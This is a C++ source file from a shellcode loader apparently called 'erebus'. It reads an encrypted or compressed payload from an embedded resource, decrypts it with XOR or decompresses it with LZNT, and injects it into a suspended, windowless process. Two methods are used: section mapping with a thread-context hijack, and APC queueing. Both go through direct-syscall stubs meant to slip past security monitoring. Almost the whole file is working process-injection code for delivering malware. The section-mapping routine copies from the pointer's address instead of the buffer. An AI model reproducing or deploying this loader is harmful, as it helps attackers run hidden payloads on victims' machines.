#include "loader.hpp"

namespace erebus {
	erebus::Config erebus::config{};

	VOID DecompressionLZNT(_Inout_ BYTE* Input, IN SIZE_T InputLen)
	{
		SIZE_T OutputLen = InputLen * 2;
		BYTE* Output = new BYTE[OutputLen];
		ULONG FinalOutputSize;

		ImportModule(ntdll);
		ImportFunction(ntdll, typeRtlDecompressBuffer, _RtlDecompressBuffer);

		NTSTATUS status = _RtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1, Output, OutputLen, Input, InputLen, &FinalOutputSize);

		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("RtlDecompressBuffer failed 0x%08X", status);
			delete[] Output;
			return;
		}

		RtlCopyMemory(Input, Output, FinalOutputSize);
		delete[] Output;
		return;
	}

	VOID DecryptionXOR(_Inout_ BYTE* Input, IN SIZE_T InputLen, IN BYTE* Key, IN SIZE_T KeyLen)
	{
		for (SIZE_T i = 0; i < InputLen; i++)
			Input[i] ^= Key[i % KeyLen];
		return;
	}

	BOOL StageResource(IN int resource_id, IN LPCWSTR resource_class, OUT PBYTE* shellcode, OUT SIZE_T* shellcode_size)
	{
		BOOL success = FALSE;
		PVOID shellcode_address;

		HRSRC resource_handle = FindResourceW(nullptr, MAKEINTRESOURCEW(resource_id), resource_class);
		if (!resource_handle)
		{
			LOG_ERROR("Failed to get resource handle. (Code: 0x%08lX)", GetLastError());
			return success;
		}

		DWORD resource_size = SizeofResource(nullptr, resource_handle);

		HGLOBAL global_handle = LoadResource(nullptr, resource_handle);
		if (!global_handle)
		{
			LOG_ERROR("Failed to get global handle. (Code: 0x%08lX)", GetLastError());
			return success;
		}

		PVOID resource_pointer = LockResource(global_handle);
		if (!resource_pointer)
		{
			LOG_ERROR("Failed to get resource pointer. (Code: 0x%08lX)", GetLastError());
			return success;
		}

		shellcode_address = HeapAlloc(GetProcessHeap(), 0, resource_size);
		if (shellcode_address)
		{
			RtlCopyMemory(shellcode_address, resource_pointer, resource_size);
			success = TRUE;
		}

		*shellcode_size = (SIZE_T)resource_size;
		*shellcode = (BYTE*)shellcode_address;
		return success;
	}

	PVOID WriteShellcodeInMemory(IN HANDLE process_handle, IN BYTE* shellcode, IN SIZE_T shellcode_size)
	{
		SIZE_T bytes_written = 0;
		PVOID base_address = NULL;
		HMODULE ntdll = NULL;
		DWORD old_protection = 0;

		if (!NT_SUCCESS(Sw3NtAllocateVirtualMemory(process_handle, &base_address, 0, &shellcode_size, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)))
		{
			LOG_ERROR("Failed to allocate memory space.");
			return NULL;
		}
		else LOG_SUCCESS("Address Pointer: 0x%08pX", base_address);

		if (!NT_SUCCESS(Sw3NtWriteVirtualMemory(process_handle, base_address, shellcode, shellcode_size, &bytes_written)))
		{
			LOG_ERROR("Error writing shellcode to memory.");
			return NULL;
		}
		else LOG_SUCCESS("Shellcode written to memory.");

		if (!NT_SUCCESS(Sw3NtProtectVirtualMemory(process_handle, &base_address, &shellcode_size, PAGE_EXECUTE_READ, &old_protection)))
		{
			LOG_ERROR("Failed to change protection type.");
			return NULL;
		}
		else LOG_SUCCESS("Protection changed to RX.");

		return base_address;
	}

	BOOL CreateProcessSuspended(IN wchar_t cmd[], OUT HANDLE* process_handle, OUT HANDLE* thread_handle)
	{
		SIZE_T lpSize = 0;
		const DWORD attribute_count = 1;

		STARTUPINFOW startup_info = {};
		PROCESS_INFORMATION process_info = {};

		BOOL success = CreateProcessW(
			NULL,
			cmd,
			NULL,
			NULL,
			FALSE,
			(CREATE_NO_WINDOW | CREATE_SUSPENDED),
			NULL,
			NULL,
			&startup_info,
			&process_info);

		*process_handle = process_info.hProcess;
		*thread_handle = process_info.hThread;

		return success;
	}

	VOID InjectionNtMapViewOfSection(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle)
	{
		LOG_INFO("Injection via. NtUnmapViewOfSection");

		HANDLE section_handle;
		LARGE_INTEGER section_size = { shellcode_size };

		NTSTATUS status = Sw3NtCreateSection(
			&section_handle,
			SECTION_ALL_ACCESS,
			NULL,
			&section_size,
			PAGE_EXECUTE_READWRITE,
			SEC_COMMIT,
			NULL);

		PVOID local_address = NULL;
		SIZE_T view_size = 0;

		status = Sw3NtMapViewOfSection(
			section_handle,
			GetCurrentProcess(),
			&local_address,
			NULL,
			NULL,
			NULL,
			&view_size,
			ViewShare,
			NULL,
			PAGE_READWRITE);

		RtlCopyMemory(local_address, &shellcode, shellcode_size);

		PVOID remote_address = NULL;

		status = Sw3NtMapViewOfSection(
			section_handle,
			process_handle,
			&remote_address,
			NULL,
			NULL,
			NULL,
			&view_size,
			ViewShare,
			NULL,
			PAGE_EXECUTE_READ);

		LPCONTEXT context_ptr = new CONTEXT();
		context_ptr->ContextFlags = CONTEXT_INTEGER;
		GetThreadContext(thread_handle, context_ptr);

		context_ptr->Rcx = (DWORD64)remote_address;
		SetThreadContext(thread_handle, context_ptr);

		ResumeThread(thread_handle);

		status = Sw3NtUnmapViewOfSection(
			GetCurrentProcess(),
			local_address);

		LOG_SUCCESS("Injection Complete!");
		return;
	}

	VOID InjectionNtQueueApcThread(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
	{
		LOG_INFO("Injection via. NtQueueApcThread");

		PVOID base_address = NULL;

		base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
		if (base_address == NULL) {
			LOG_ERROR("Failed to write shellcode to memory region");
			return;
		}

		Sw3NtQueueApcThread(hThread, (PPS_APC_ROUTINE)base_address, NULL, NULL, NULL);
		Sw3NtResumeThread(hThread, NULL);

		Sw3NtFreeVirtualMemory(hThread, &base_address, &shellcode_size, MEM_RELEASE);

		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);

		LOG_SUCCESS("Injection Complete!");

		return;
	}
} // End of erebus namespace
